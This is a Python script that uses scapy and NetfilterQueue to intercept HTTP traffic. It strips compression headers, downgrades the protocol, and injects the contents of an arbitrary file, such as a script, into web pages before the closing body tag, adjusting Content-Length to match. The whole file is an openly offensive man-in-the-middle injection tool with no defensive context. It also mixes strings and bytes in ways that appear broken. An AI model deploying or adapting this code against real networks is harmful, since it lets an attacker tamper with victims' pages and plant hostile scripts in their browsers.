from scapy.all import *
import re
from netfilterqueue import NetfilterQueue

inject = None

def packmain(pack):
    scpack = IP(pack.get_payload())

    if scpack.haslayer(TCP) and scpack.haslayer(Raw):
        load = scpack[Raw].load
        if scpack[TCP].dport == 80:
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", str(load))
            load = load.replace("HTTP/1.1", "HTTP/1.0")
        if scpack[TCP].sport == 80:
            load = load.replace(b"</body>", inject + b"</body>")
            length_search = re.search("(?:Content-Length:\s)(\d*)", str(load))
            if length_search and "text/html" in str(load):
                length = length_search.group(1)
                new_length = int(length) + len(str(inject))
                load = load.replace(bytes(length.encode()), bytes(str(new_length).encode()))
        if load != scpack[Raw].load:
            newpack = injectcode(scpack, load)
            pack.set_payload(bytes(newpack))
    pack.accept()


def injectcode(pack, load):
    pack[Raw].load = load
    del pack[IP].len
    del pack[IP].chksum
    del pack[TCP].chksum
    return pack

def start(fileaddress):
    global inject
    with open(fileaddress, "r") as f:
        read = f.read()
        f.close()

    inject = read.encode()
    queue = NetfilterQueue()
    queue.bind(0, packmain)
    queue.run()

    queue.unbind()
